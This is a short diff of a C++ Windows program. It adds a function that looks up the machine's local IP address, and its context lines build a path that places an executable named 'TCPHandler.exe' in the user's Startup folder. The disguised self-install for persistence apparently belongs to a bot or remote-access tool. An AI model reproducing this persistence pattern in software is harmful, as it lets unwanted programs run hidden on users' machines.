@@ -5,6 +5,17 @@
 
 std::string startUpPath = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TCPHandler.exe";
 
+uint32_t getPrivateIP()
+{
+    char hostName[255];
+    char* localIP;
+    struct hostent* host_entry;
+
+    gethostname(hostName, 255);
+    host_entry = gethostbyname(hostName);
+    return (*(struct in_addr*)*host_entry->h_addr_list).s_addr;
+}
+
 bool isInStartUp(char* filePath)
 {
     std::string fileName, startUpFileName;
